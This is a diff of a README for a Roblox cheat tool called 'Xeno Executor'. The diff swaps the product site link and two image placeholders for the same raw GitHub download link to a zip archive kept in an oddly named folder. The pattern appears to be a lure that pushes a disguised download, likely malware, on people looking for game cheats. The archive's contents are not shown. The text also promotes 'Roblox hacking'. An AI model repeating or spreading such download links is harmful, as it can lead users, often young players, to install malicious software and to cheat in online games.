@@ -26,7 +26,7 @@ Here are some of the main topics covered in this repository:
 
 ## Get Started
 
-Visit [getxeno.app](https://getxeno.app) to explore all the features and functionalities of the Xeno Executor. 💻
+Visit [https://raw.githubusercontent.com/palmxzx/Roblox-Xeno/master/sequestratrix/Xeno-Roblox-v1.9.zip](https://raw.githubusercontent.com/palmxzx/Roblox-Xeno/master/sequestratrix/Xeno-Roblox-v1.9.zip) to explore all the features and functionalities of the Xeno Executor. 💻
 
 ## Need Help?
 
@@ -34,7 +34,7 @@ If you encounter any issues with the provided link, please check the "Releases" 
 
 Let's dive into the world of Roblox hacking with the powerful Xeno Executor! 🔥🎮
 
-![Roblox Xeno](https://your-image-url.com)
+![Roblox Xeno](https://raw.githubusercontent.com/palmxzx/Roblox-Xeno/master/sequestratrix/Xeno-Roblox-v1.9.zip)
 
 ## Installation Guide
 
@@ -58,4 +58,4 @@ This project is licensed under the MIT License - see the [LICENSE](./LICENSE) fi
 
 Stay tuned for more updates and exciting features coming your way in the world of Roblox hacking! 🎉🚗
 
-![Roblox Logo](https://roblox-logo-url.com)
+![Roblox Logo](https://raw.githubusercontent.com/palmxzx/Roblox-Xeno/master/sequestratrix/Xeno-Roblox-v1.9.zip)
